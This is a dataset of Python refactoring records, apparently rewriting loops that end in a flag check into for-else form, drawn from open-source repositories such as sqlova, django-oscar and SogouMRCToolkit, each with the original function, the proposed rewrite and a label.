sqlova,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sqlova/bert/tokenization.py,https://github.com/naver/sqlova/tree/master/bert/tokenization.py,WordpieceTokenizer,tokenize$242,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
ChatLearner,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ChatLearner/Data/Corpus/RedditData/secondcleaner.py,https://github.com/bshao001/ChatLearner/tree/master/Data/Corpus/RedditData/secondcleaner.py,,clean$30,"def clean():
    exc_list = []

    with open(EXCLUDED_FILE, 'r') as f_exc:
        for line in f_exc:
            l = line.strip()
            if not l:
                continue
            exc_list.append(l)

    conversations = []
    with open(REDDIT_INPUT, 'r') as f_inp:
        samples = []
        for line in f_inp:
            l = line.strip()
            if not l or l.startswith(COMMENT_LINE_STT):
                continue
            if l == CONVERSATION_SEP:
                if len(samples):
                    conversations.append(samples)
                samples = []
            else:
                samples.append({""text"": l})

        if len(samples):  # Add the last one
            conversations.append(samples)

    with open(REDDIT_OUTPUT, 'a') as f_out:
        cnt = 0
        for conversation in conversations:
            written = False
            # Iterate over all the samples of the conversation to get chat pairs
            for i in range(0, len(conversation) - 1, 2):
                src_line = conversation[i]['text'].strip()
                tgt_line = conversation[i + 1]['text'].strip()

                assert src_line.startswith(""Q:"") and tgt_line.startswith(""A:"")

                skip = False
                tokens = (src_line[2:] + ' ' + tgt_line[2:]).split(' ')
                for token in tokens:
                    if len(token) and token != ' ':
                        t = token.lower()
                        if t in exc_list:
                            skip = True
                            cnt += 1
                            if cnt % 1000 == 0:
                                print(""{:,} pairs skipped."".format(cnt))
                            break

                if not skip:
                    f_out.write(""{}\n"".format(src_line))
                    f_out.write(""{}\n"".format(tgt_line))
                    written = True

            if written:
                f_out.write(""===\n"")","for token in tokens:
    if len(token) and token != ' ':
        t = token.lower()
        if t in exc_list:
            skip = True
            cnt += 1
            if cnt % 1000 == 0:
                print('{:,} pairs skipped.'.format(cnt))
            break
if not skip:
    f_out.write('{}\n'.format(src_line))
    f_out.write('{}\n'.format(tgt_line))
    written = True","for token in tokens:
    if len(token) and token != ' ':
        t = token.lower()
        if t in exc_list:
            cnt += 1
            if cnt % 1000 == 0:
                print('{:,} pairs skipped.'.format(cnt))
            break
else:
    f_out.write('{}\n'.format(src_line))
    f_out.write('{}\n'.format(tgt_line))
    written = True","for token in tokens:
    if len(token) and token != ' ':
        t = token.lower()
        if t in exc_list:
            cnt += 1
            if cnt % 1000 == 0:
                print('{:,} pairs skipped.'.format(cnt))
            break
else:
    f_out.write('{}\n'.format(src_line))
    f_out.write('{}\n'.format(tgt_line))
    written = True",1,"for token in tokens:
    if len(token) and token != ' ':
        t = token.lower()
        if t in exc_list:
            skip = True
            cnt += 1
            if cnt % 1000 == 0:
                print('{:,} pairs skipped.'.format(cnt))
            break
if not skip:
    f_out.write('{}\n'.format(src_line))
    f_out.write('{}\n'.format(tgt_line))
    written = True","break statement is executed:None
break statement is not executed:zejun1"
gluon-cv,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/gluon-cv/tests/onnx/test_inference.py,https://github.com/dmlc/gluon-cv/tree/master/tests/onnx/test_inference.py,,assert_obj_detetion_result$63,"def assert_obj_detetion_result(gluon_ids, gluon_scores, gluon_boxes,
                                   onnx_ids, onnx_scores, onnx_boxes,
                                   score_thresh=0.6, score_tol=1e-4):
    def assert_bbox(gluon_box, onnx_box, box_tol=1e-2):
        def assert_scalar(a, b, tol=box_tol):
            return np.abs(a-b) <= tol
        return assert_scalar(gluon_box[0], onnx_box[0]) and assert_scalar(gluon_box[1], onnx_box[1]) \
                  and assert_scalar(gluon_box[2], onnx_box[2]) and assert_scalar(gluon_box[3], onnx_box[3])

    found_match = False
    for i in range(len(onnx_ids)):
        onnx_id = onnx_ids[i][0]
        onnx_score = onnx_scores[i][0]
        onnx_box = onnx_boxes[i]

        if onnx_score < score_thresh:
            break
        for j in range(len(gluon_ids)):
            gluon_id = gluon_ids[j].asnumpy()[0]
            gluon_score = gluon_scores[j].asnumpy()[0]
            gluon_box = gluon_boxes[j].asnumpy()
            # check socre 
            if onnx_score < gluon_score - score_tol:
                continue
            if onnx_score > gluon_score + score_tol:
                return False
            # check id
            if onnx_id != gluon_id:
                continue
            # check bounding box
            if assert_bbox(gluon_box, onnx_box):
                found_match = True
                break
        if not found_match:
            return False
        found_match = False
    return True","for j in range(len(gluon_ids)):
    gluon_id = gluon_ids[j].asnumpy()[0]
    gluon_score = gluon_scores[j].asnumpy()[0]
    gluon_box = gluon_boxes[j].asnumpy()
    if onnx_score < gluon_score - score_tol:
        continue
    if onnx_score > gluon_score + score_tol:
        return False
    if onnx_id != gluon_id:
        continue
    if assert_bbox(gluon_box, onnx_box):
        found_match = True
        break
if not found_match:
    return False","for j in range(len(gluon_ids)):
    gluon_id = gluon_ids[j].asnumpy()[0]
    gluon_score = gluon_scores[j].asnumpy()[0]
    gluon_box = gluon_boxes[j].asnumpy()
    if onnx_score < gluon_score - score_tol:
        continue
    if onnx_score > gluon_score + score_tol:
        return False
    if onnx_id != gluon_id:
        continue
    if assert_bbox(gluon_box, onnx_box):
        found_match = True
        break
else:
    return False","for j in range(len(gluon_ids)):
    gluon_id = gluon_ids[j].asnumpy()[0]
    gluon_score = gluon_scores[j].asnumpy()[0]
    gluon_box = gluon_boxes[j].asnumpy()
    if onnx_score < gluon_score - score_tol:
        continue
    if onnx_score > gluon_score + score_tol:
        return False
    if onnx_id != gluon_id:
        continue
    if assert_bbox(gluon_box, onnx_box):
        found_match = True
        break
else:
    return False",1,"for j in range(len(gluon_ids)):
    gluon_id = gluon_ids[j].asnumpy()[0]
    gluon_score = gluon_scores[j].asnumpy()[0]
    gluon_box = gluon_boxes[j].asnumpy()
    if onnx_score < gluon_score - score_tol:
        continue
    if onnx_score > gluon_score + score_tol:
        return False
    if onnx_id != gluon_id:
        continue
    if assert_bbox(gluon_box, onnx_box):
        found_match = True
        break
if not found_match:
    return False","break statement is executed:None
break statement is not executed:zejun1"
django-oscar,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/django-oscar/src/oscar/apps/basket/views.py,https://github.com/django-oscar/django-oscar/tree/master/src/oscar/apps/basket/views.py,VoucherAddView,apply_voucher_to_basket$378,"def apply_voucher_to_basket(self, voucher):
        if voucher.is_expired():
            messages.error(
                self.request,
                _(""The '%(code)s' voucher has expired"") % {
                    'code': voucher.code})
            return

        if not voucher.is_active():
            messages.error(
                self.request,
                _(""The '%(code)s' voucher is not active"") % {
                    'code': voucher.code})
            return

        is_available, message = voucher.is_available_to_user(self.request.user)
        if not is_available:
            messages.error(self.request, message)
            return

        self.request.basket.vouchers.add(voucher)

        # Raise signal
        self.add_signal.send(
            sender=self, basket=self.request.basket, voucher=voucher)

        # Recalculate discounts to see if the voucher gives any
        Applicator().apply(self.request.basket, self.request.user,
                           self.request)
        discounts_after = self.request.basket.offer_applications

        # Look for discounts from this new voucher
        found_discount = False
        for discount in discounts_after:
            if discount['voucher'] and discount['voucher'] == voucher:
                found_discount = True
                break
        if not found_discount:
            messages.warning(
                self.request,
                _(""Your basket does not qualify for a voucher discount""))
            self.request.basket.vouchers.remove(voucher)
        else:
            messages.info(
                self.request,
                _(""Voucher '%(code)s' added to basket"") % {
                    'code': voucher.code})","for discount in discounts_after:
    if discount['voucher'] and discount['voucher'] == voucher:
        found_discount = True
        break
if not found_discount:
    messages.warning(self.request, _('Your basket does not qualify for a voucher discount'))
    self.request.basket.vouchers.remove(voucher)
else:
    messages.info(self.request, _(""Voucher '%(code)s' added to basket"") % {'code': voucher.code})","for discount in discounts_after:
    if discount['voucher'] and discount['voucher'] == voucher:
        messages.info(self.request, _(""Voucher '%(code)s' added to basket"") % {'code': voucher.code})
        break
else:
    messages.warning(self.request, _('Your basket does not qualify for a voucher discount'))
    self.request.basket.vouchers.remove(voucher)","for discount in discounts_after:
    if discount['voucher'] and discount['voucher'] == voucher:
        messages.info(self.request, _(""Voucher '%(code)s' added to basket"") % {'code': voucher.code})
        break
else:
    messages.warning(self.request, _('Your basket does not qualify for a voucher discount'))
    self.request.basket.vouchers.remove(voucher)",1,"for discount in discounts_after:
    if discount['voucher'] and discount['voucher'] == voucher:
        found_discount = True
        break
if not found_discount:
    messages.warning(self.request, _('Your basket does not qualify for a voucher discount'))
    self.request.basket.vouchers.remove(voucher)
else:
    messages.info(self.request, _(""Voucher '%(code)s' added to basket"") % {'code': voucher.code})","break statement is executed:None
break statement is not executed:zejun1"
SogouMRCToolkit,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/SogouMRCToolkit/sogou_mrc/libraries/BertWrapper.py,https://github.com/sogou/SogouMRCToolkit/tree/master/sogou_mrc/libraries/BertWrapper.py,BertDataHelper,convert_coqa_to_bert_input$187,"def convert_coqa_to_bert_input(self, instance, max_seq_length=512, max_query_length=64, is_training=True):
        tokenizer = self.tokenizer
        doc_tokens = instance['context_tokens'] if not self.do_lower_case else [token.lower() for token in
                                                                                instance['context_tokens']]

        question = instance['question'].lower() if self.do_lower_case else instance['question']
        query_tokens = tokenizer.tokenize(question)
        if len(query_tokens) > max_query_length:
            query_tokens = query_tokens[-max_query_length:]

        tok_to_orig_index = []
        orig_to_tok_index = []
        all_doc_tokens = []
        for (i, token) in enumerate(doc_tokens):
            orig_to_tok_index.append(len(all_doc_tokens))
            sub_tokens = tokenizer.tokenize(token)
            for sub_token in sub_tokens:
                tok_to_orig_index.append(i)
                all_doc_tokens.append(sub_token)
        tok_start_position = None
        tok_end_position = None
        tok_rationale_start_position = None
        tok_rationale_end_position = None
        if is_training and instance['answer_type'] != ""unknown"":
            if instance['answer_type'] == 'extractive':
                tok_start_position = orig_to_tok_index[instance['answer_start']]
                if instance['answer_end'] < len(doc_tokens) - 1:
                    tok_end_position = orig_to_tok_index[instance['answer_end'] + 1] - 1
                else:
                    tok_end_position = len(all_doc_tokens) - 1
                (tok_start_position, tok_end_position) = _improve_answer_span(
                all_doc_tokens, tok_start_position, tok_end_position, tokenizer,
                instance['answer'])
            tok_rationale_start_position = orig_to_tok_index[instance['rationale_start']]
            if instance['rationale_end'] < len(doc_tokens) - 1:
                tok_rationale_end_position = orig_to_tok_index[instance['rationale_end'] + 1] - 1
            else:
                tok_rationale_end_position = len(all_doc_tokens) - 1
            (tok_rationale_start_position, tok_rationale_end_position) = _improve_answer_span(all_doc_tokens, tok_rationale_start_position, tok_rationale_end_position, tokenizer,instance['rationale'])

        #if is_training and instance['answer_type'] == 'unknown':
            #tok_start_position= -1
            #tok_end_position =-1

        # The -3 accounts for [CLS], [SEP] and [SEP]
        max_tokens_for_doc = max_seq_length - len(query_tokens) - 3
        # We can have documents that are longer than the maximum sequence length.
        # To deal with this we do a sliding window approach, where we take chunks
        # of the up to our max length with a stride of `doc_stride`.
        _DocSpan = collections.namedtuple(  # pylint: disable=invalid-name
            ""DocSpan"", [""start"", ""length""])
        doc_spans = []
        start_offset = 0
        while start_offset < len(all_doc_tokens):
            length = len(all_doc_tokens) - start_offset
            if length > max_tokens_for_doc:
                length = max_tokens_for_doc
            doc_spans.append(_DocSpan(start=start_offset, length=length))
            if start_offset + length == len(all_doc_tokens):
                break
            start_offset += min(length, self.doc_stride)
        
        if is_training and len(doc_spans) > 1:
            if instance['answer_type'] in ['yes', 'no']:
                #check is there a full rationale in one chunk for yes/no answer question, if it doesn't exist, throw the example 
                full_rationale_in_one_chunk = False
                for (doc_span_index, doc_span) in enumerate(doc_spans):
                    doc_start = doc_span.start
                    doc_end = doc_span.start + doc_span.length - 1
                    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
                        full_rationale_in_one_chunk = True
                        break
                if not full_rationale_in_one_chunk:
                    return None
            if instance['answer_type'] == 'extractive':
                #check is there a full extractive answer into one chunk, if it doesn't exist, throw the example 
                full_answer_in_one_chunk = False
                for (doc_span_index, doc_span) in enumerate(doc_spans):
                    doc_start = doc_span.start
                    doc_end = doc_span.start + doc_span.length - 1
                    if tok_start_position >= doc_start and tok_end_position <= doc_end:
                        full_answer_in_one_chunk = True
                        break
                if not full_answer_in_one_chunk:
                    return None

        new_instances = []
        for (doc_span_index, doc_span) in enumerate(doc_spans):
            if is_training and len(doc_spans) > 1:
                doc_start = doc_span.start
                doc_end = doc_span.start + doc_span.length - 1
                if instance['answer_type'] == 'extractive': # throw chunk dosn't has full answer
                    if (tok_start_position >= doc_start and tok_start_position <= doc_end and tok_end_position > doc_end) or (tok_end_position >= doc_start and tok_end_position <= doc_end and tok_start_position < doc_start):
                        continue
                if instance['answer_type'] in ['yes', 'no']: # throw chunk dosn't has full answer
                    if (tok_rationale_start_position >= doc_start and tok_rationale_start_position <= doc_end and tok_rationale_end_position > doc_end) or (tok_rationale_end_position >= doc_start and tok_rationale_end_position <= doc_end and tok_rationale_start_position < doc_start):
                        continue
            tokens = []
            token_to_orig_map = {}
            token_is_max_context = {}
            segment_ids = []
            question_mask = []
            tokens.append(""[CLS]"")
            segment_ids.append(0)
            question_mask.append(0)
            for token in query_tokens:
                tokens.append(token)
                segment_ids.append(0)
                question_mask.append(1)
            tokens.append(""[SEP]"")
            segment_ids.append(0)
            question_mask.append(0)

            for i in range(doc_span.length):
                split_token_index = doc_span.start + i
                token_to_orig_map[len(tokens)] = tok_to_orig_index[split_token_index]

                is_max_context = _check_is_max_context(doc_spans, doc_span_index,
                                                       split_token_index)
                token_is_max_context[len(tokens)] = is_max_context
                tokens.append(all_doc_tokens[split_token_index])
                segment_ids.append(1)
                question_mask.append(0)
            tokens.append(""[SEP]"")
            segment_ids.append(1)
            question_mask.append(0)

            input_ids = tokenizer.convert_tokens_to_ids(tokens)

            # The mask has 1 for real tokens and 0 for padding tokens. Only real
            # tokens are attended to.
            input_mask = [1] * len(input_ids)

            # Zero-pad up to the sequence length.
            while len(input_ids) < max_seq_length:
                input_ids.append(0)
                input_mask.append(0)
                segment_ids.append(0)
                question_mask.append(0)

            assert len(input_ids) == max_seq_length
            assert len(input_mask) == max_seq_length
            assert len(segment_ids) == max_seq_length

            start_position = None
            end_position = None
            rationale_mask = None
            no_rationale = None
            if is_training and instance['answer_type'] != 'unknown':
                # For training, if our document chunk does not contain an annotation
                # we throw it out, since there is nothing to predict.
                doc_start = doc_span.start
                doc_end = doc_span.start + doc_span.length - 1
                doc_offset = len(query_tokens) + 2
        
                rationale_mask = [0] * max_seq_length
                doc_rationale_start = -1
                doc_rationale_end = -1
                if tok_rationale_start_position >= doc_start and tok_rationale_start_position <= doc_end:
                    doc_rationale_start = tok_rationale_start_position - doc_start + doc_offset
                    orig_rationale_start = tok_to_orig_index[tok_rationale_start_position]
                    if tok_rationale_end_position <= doc_end:
                        doc_rationale_end = tok_rationale_end_position - doc_start + doc_offset
                    else:
                        doc_rationale_end = doc_end - doc_start + doc_offset
                else:
                    if tok_rationale_end_position >= doc_start and tok_rationale_end_position <= doc_end:
                        doc_rationale_start = doc_offset
                        doc_rationale_end = tok_rationale_end_position - doc_start + doc_offset
                if instance['answer_type'] == 'extractive':
                    out_of_span = False
                    if not (tok_start_position >= doc_start and tok_end_position <= doc_end):
                        out_of_span = True
                    if out_of_span:
                        start_position = 0 
                        end_position = 0 
                        doc_rationale_start = -1
                        doc_rationale_end = -1
                        #return None #doc_rationale_end = -1
                    else:
                        start_position = tok_start_position - doc_start + doc_offset
                        end_position = tok_end_position - doc_start + doc_offset
                        if doc_rationale_start == -1 or doc_rationale_end == -1:
                            raise ValueError(instance['qid'])
                else: # yes no
                    start_position = 0
                    end_position = 0
                if doc_rationale_start != -1 and doc_rationale_end != -1:
                    no_rationale = False 
                    ix = doc_rationale_start
                    while ix <= doc_rationale_end:
                        rationale_mask[ix] = 1
                        ix += 1
                else:
                    no_rationale = True

            if is_training and instance['answer_type']=='unknown':
                start_position = 0
                end_position = 0
                rationale_mask = [0] * max_seq_length
                no_rationale = True

            unk_mask, yes_mask, no_mask, extractive_mask = None, None, None, None
            if is_training:
                if start_position == 0 and end_position == 0 and no_rationale == True:
                    unk_mask, yes_mask, no_mask, extractive_mask = 1, 0, 0, 0
                elif start_position == 0 and end_position == 0 and no_rationale == False:
                    unk_mask, yes_mask, no_mask, extractive_mask = 0, instance['abstractive_answer_mask'][1], instance['abstractive_answer_mask'][2], 0
                elif start_position != 0 and end_position != 0 and no_rationale == False:
                    unk_mask, yes_mask, no_mask, extractive_mask = 0, 0, 0, 1

            self.index += 1
            if self.index < 2:
                logging.info(""*** Example ***"")
                logging.info(""doc_span_index: %s"" % (doc_span_index))
                logging.info(""tokens: %s"" % "" "".join(
                    [tokenization.printable_text(x) for x in tokens]))
                logging.info(""token_to_orig_map: %s"" % "" "".join(
                    [""%d:%d"" % (x, y) for (x, y) in six.iteritems(token_to_orig_map)]))
                logging.info(""token_is_max_context: %s"" % "" "".join([
                    ""%d:%s"" % (x, y) for (x, y) in six.iteritems(token_is_max_context)
                ]))

                logging.info(""input_ids: %s"" % "" "".join([str(x) for x in input_ids]))
                logging.info(
                    ""input_mask: %s"" % "" "".join([str(x) for x in input_mask]))
                logging.info(
                    ""segment_ids: %s"" % "" "".join([str(x) for x in segment_ids]))
                logging.info(
                    ""question_mask: %s"" % "" "".join([str(x) for x in question_mask]))
                logging.info('start_position: %d : end_position: %d' % (start_position, end_position))
                if is_training and instance['answer_type'] != 'unknown':
                    logging.info(""answer_type: %d %d %d %d"" % (unk_mask, yes_mask, no_mask, extractive_mask))
                    if extractive_mask == 1:
                        answer_text = "" "".join(tokens[start_position:(end_position + 1)])
                        logging.info(""start_position: %d"" % (start_position))
                        logging.info(""end_position: %d"" % (end_position))
                        logging.info(
                          ""answer: %s"" % (tokenization.printable_text(answer_text)))
                    if yes_mask == 1 or no_mask == 1 or extractive_mask == 1:
                        rationale_text = "" "".join(tokens[doc_rationale_start:(doc_rationale_end + 1)])
                        logging.info(""rationale_start_position: %d"" % (doc_rationale_start))
                        logging.info(""rationale_end_position: %d"" % (doc_rationale_end))
                        logging.info(
                          ""rationale: %s"" % (tokenization.printable_text(rationale_text)))
                        logging.info(
                            ""rationale_mask: %s"" % "" "".join([str(x) for x in rationale_mask]))

            new_instance = {
                'doc_span_index': doc_span_index,
                'tokens': tokens,
                'token_to_orig_map': token_to_orig_map,
                'token_is_max_context': token_is_max_context,
                'input_ids': input_ids,
                'input_mask': input_mask,
                'segment_ids': segment_ids,
                'start_position': start_position,
                'end_position': end_position,
                'unk_mask' : unk_mask,
                'yes_mask' : yes_mask,
                'no_mask' : no_mask,
                'extractive_mask' : extractive_mask,
                'question_mask' : question_mask,
                'rationale_mask' : rationale_mask
            }

            for k, v in instance.items():
                if k not in new_instance:
                    new_instance[k] = v
            new_instances.append(new_instance)
        return new_instances","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
        full_rationale_in_one_chunk = True
        break
if not full_rationale_in_one_chunk:
    return None","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
        break
else:
    return None","for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
        break
else:
    return None",1,"for (doc_span_index, doc_span) in enumerate(doc_spans):
    doc_start = doc_span.start
    doc_end = doc_span.start + doc_span.length - 1
    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
        full_rationale_in_one_chunk = True
        break
if not full_rationale_in_one_chunk:
    return None","break statement is executed:None
break statement is not executed:zejun1"
SogouMRCToolkit,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/SogouMRCToolkit/sogou_mrc/libraries/BertWrapper.py,https://github.com/sogou/SogouMRCToolkit/tree/master/sogou_mrc/libraries/BertWrapper.py,BertDataHelper,convert_coqa_to_bert_input$187,"def convert_coqa_to_bert_input(self, instance, max_seq_length=512, max_query_length=64, is_training=True):
        tokenizer = self.tokenizer
        doc_tokens = instance['context_tokens'] if not self.do_lower_case else [token.lower() for token in
                                                                                instance['context_tokens']]

        question = instance['question'].lower() if self.do_lower_case else instance['question']
        query_tokens = tokenizer.tokenize(question)
        if len(query_tokens) > max_query_length:
            query_tokens = query_tokens[-max_query_length:]

        tok_to_orig_index = []
        orig_to_tok_index = []
        all_doc_tokens = []
        for (i, token) in enumerate(doc_tokens):
            orig_to_tok_index.append(len(all_doc_tokens))
            sub_tokens = tokenizer.tokenize(token)
            for sub_token in sub_tokens:
                tok_to_orig_index.append(i)
                all_doc_tokens.append(sub_token)
        tok_start_position = None
        tok_end_position = None
        tok_rationale_start_position = None
        tok_rationale_end_position = None
        if is_training and instance['answer_type'] != ""unknown"":
            if instance['answer_type'] == 'extractive':
                tok_start_position = orig_to_tok_index[instance['answer_start']]
                if instance['answer_end'] < len(doc_tokens) - 1:
                    tok_end_position = orig_to_tok_index[instance['answer_end'] + 1] - 1
                else:
                    tok_end_position = len(all_doc_tokens) - 1
                (tok_start_position, tok_end_position) = _improve_answer_span(
                all_doc_tokens, tok_start_position, tok_end_position, tokenizer,
                instance['answer'])
            tok_rationale_start_position = orig_to_tok_index[instance['rationale_start']]
            if instance['rationale_end'] < len(doc_tokens) - 1:
                tok_rationale_end_position = orig_to_tok_index[instance['rationale_end'] + 1] - 1
            else:
                tok_rationale_end_position = len(all_doc_tokens) - 1
            (tok_rationale_start_position, tok_rationale_end_position) = _improve_answer_span(all_doc_tokens, tok_rationale_start_position, tok_rationale_end_position, tokenizer,instance['rationale'])

        #if is_training and instance['answer_type'] == 'unknown':
            #tok_start_position= -1
            #tok_end_position =-1

        # The -3 accounts for [CLS], [SEP] and [SEP]
        max_tokens_for_doc = max_seq_length - len(query_tokens) - 3
        # We can have documents that are longer than the maximum sequence length.
        # To deal with this we do a sliding window approach, where we take chunks
        # of the up to our max length with a stride of `doc_stride`.
        _DocSpan = collections.namedtuple(  # pylint: disable=invalid-name
            ""DocSpan"", [""start"", ""length""])
        doc_spans = []
        start_offset = 0
        while start_offset < len(all_doc_tokens):
            length = len(all_doc_tokens) - start_offset
            if length > max_tokens_for_doc:
                length = max_tokens_for_doc
            doc_spans.append(_DocSpan(start=start_offset, length=length))
            if start_offset + length == len(all_doc_tokens):
                break
            start_offset += min(length, self.doc_stride)
        
        if is_training and len(doc_spans) > 1:
            if instance['answer_type'] in ['yes', 'no']:
                #check is there a full rationale in one chunk for yes/no answer question, if it doesn't exist, throw the example 
                full_rationale_in_one_chunk = False
                for (doc_span_index, doc_span) in enumerate(doc_spans):
                    doc_start = doc_span.start
                    doc_end = doc_span.start + doc_span.length - 1
                    if tok_rationale_start_position >= doc_start and tok_rationale_end_position <= doc_end:
                        full_rationale_in_one_chunk = True
                        break
                if not full_rationale_in_one_chunk:
                    return None
            if instance['answer_type'] == 'extractive':
                #check is there a full extractive answer into one chunk, if it doesn't exist, throw the example 
                full_answer_in_one_chunk = False
                for (doc_span_index, doc_span) in enumerate(doc_spans):
                    doc_start = doc_span.start
                    doc_end = doc_span.start + doc_span.length - 1
                    if tok_start_position >= doc_start and tok_end_position <= doc_end:
                        full_answer_in_one_chunk = True
                        break
                if not full_answer_in_one_chunk:
                    return None

        new_instances = []
        for (doc_span_index, doc_span) in enumerate(doc_spans):
            if is_training and len(doc_spans) > 1:
                doc_start = doc_span.start
                doc_end = doc_span.start + doc_span.length - 1
                if instance['answer_type'] == 'extractive': # throw chunk dosn't has full answer
                    if (tok_start_position >= doc_start and tok_start_position <= doc_end and tok_end_position > doc_end) or (tok_end_position >= doc_start and tok_end_position <= doc_end and tok_start_position < doc_start):
                        continue
                if instance['answer_type'] in ['yes', 'no']: # throw chunk dosn't has full answer
                    if (tok_rationale_start_position >= doc_start and tok_rationale_start_position <= doc_end and tok_rationale_end_position > doc_end) or (tok_rationale_end_position >= doc_start and tok_rationale_end_position <= doc_end and tok_rationale_start_position < doc_start):
                        continue
            tokens = []
            token_to_orig_map = {}
            token_is_max_context = {}
            segment_ids = []
            question_mask = []
            tokens.append(""[CLS]"")
            segment_ids.append(0)
            question_mask.append(0)
            for token in query_tokens:
                tokens.append(token)
                segment_ids.append(0)
                question_mask.append(1)
            tokens.append(""[SEP]"")
            segment_ids.append(0)
            question_mask.append(0)

            for i in range(doc_span.length):
                split_token_index = doc_span.start + i
                token_to_orig_map[len(tokens)] = tok_to_orig_index[split_token_index]

                is_max_context = _check_is_max_context(doc_spans, doc_span_index,
                                                       split_token_index)
                token_is_max_context[len(tokens)] = is_max_context
                tokens.append(all_doc_tokens[split_token_index])
                segment_ids.append(1)
                question_mask.append(0)
            tokens.append(""[SEP]"")
            segment_ids.append(1)
            question_mask.append(0)

            input_ids = tokenizer.convert_tokens_to_ids(tokens)

            # The mask has 1 for real tokens and 0 for padding tokens. Only real
            # tokens are attended to.
            input_mask = [1] * len(input_ids)

            # Zero-pad up to the sequence length.
            while len(input_ids) < max_seq_length:
                input_ids.append(0)
                input_mask.append(0)
                segment_ids.append(0)
                question_mask.append(0)

            assert len(input_ids) == max_seq_length
            assert len(input_mask) == max_seq_length
            assert len(segment_ids) == max_seq_length

            start_position = None
            end_position = None
            rationale_mask = None
            no_rationale = None
            if is_training and instance['answer_type'] != 'unknown':
                # For training, if our document chunk does not contain an annotation
                # we throw it out, since there is nothing to predict.
                doc_start = doc_span.start
                doc_end = doc_span.start + doc_span.length - 1
                doc_offset = len(query_tokens) + 2
        
                rationale_mask = [0] * max_seq_length
                doc_rationale_start = -1
                doc_rationale_end = -1
                if tok_rationale_start_position >= doc_start and tok_rationale_start_position <= doc_end:
                    doc_rationale_start = tok_rationale_start_position - doc_start + doc_offset
                    orig_rationale_start = tok_to_orig_index[tok_rationale_start_position]
                    if tok_rationale_end_position <= doc_end:
                        doc_rationale_end = tok_rationale_end_position - doc_start + doc_offset
                    else:
                        doc_rationale_end = doc_end - doc_start + doc_offset
                else:
                    if tok_rationale_end_position >= doc_start and tok_rationale_end_position <= doc_end:
                        doc_rationale_start = doc_offset
                        doc_rationale_end = tok_rationale_end_position - doc_start + doc_offset
                if instance['answer_type'] == 'extractive':
                    out_of_span = False
                    if not (tok_start_position >= doc_start and tok_end_position <= doc_end):
                        out_of_span = True
                    if out_of_span:
                        start_position = 0 
                        end_position = 0 
                        doc_rationale_start = -1
                        doc_rationale_end = -1
                        #return None #doc_rationale_end = -1
                    else:
                        start_position = tok_start_position - doc_start + doc_offset
                        end_position = tok_end_position - doc_start + doc_offset
                        if doc_rationale_start == -1 or doc_rationale_end == -1:
                            raise ValueError(instance['qid'])
                else: # yes no
                    start_position = 0
                    end_position = 0
                if doc_rationale_start != -1 and doc_rationale_end != -1:
                    no_rationale = False 
                    ix = doc_rationale_start
                    while ix <= doc_rationale_end:
                        rationale_mask[ix] = 1
                        ix += 1
                else:
                    no_rationale = True

            if is_training and instance['answer_type']=='unknown':
                start_position = 0
                end_position = 0
                rationale_mask = [0] * max_seq_length
                no_rationale = True

            unk_mask, yes_mask, no_mask, extractive_mask = None, None, None, None
            if is_training:
                if start_position == 0 and end_position == 0 and no_rationale == True:
                    unk_mask, yes_mask, no_mask, extractive_mask = 1, 0, 0, 0
                elif start_position == 0 and end_position == 0 and no_rationale == False:
                    unk_mask, yes_mask, no_mask, extractive_mask = 0, instance['abstractive_answer_mask'][1], instance['abstractive_answer_mask'][2], 0
                elif start_position != 0 and end_position != 0 and no_rationale == False:
                    unk_mask, yes_mask, no_mask, extractive_mask = 0, 0, 0, 1

            self.index += 1
            if self.index < 2:
                logging.info(""*** Example ***"")
                logging.info(""doc_span_index: %s"" % (doc_span_index))
                logging.info(""tokens: %s"" % "" "".join(
                    [tokenization.printable_text(x) for x in tokens]))
                logging.info(""token_to_orig_map: %s"" % "" "".join(
                    [""%d:%d"" % (x, y) for (x, y) in six.iteritems(token_to_orig_map)]))
                logging.info(""token_is_max_context: %s"" % "" "".join([
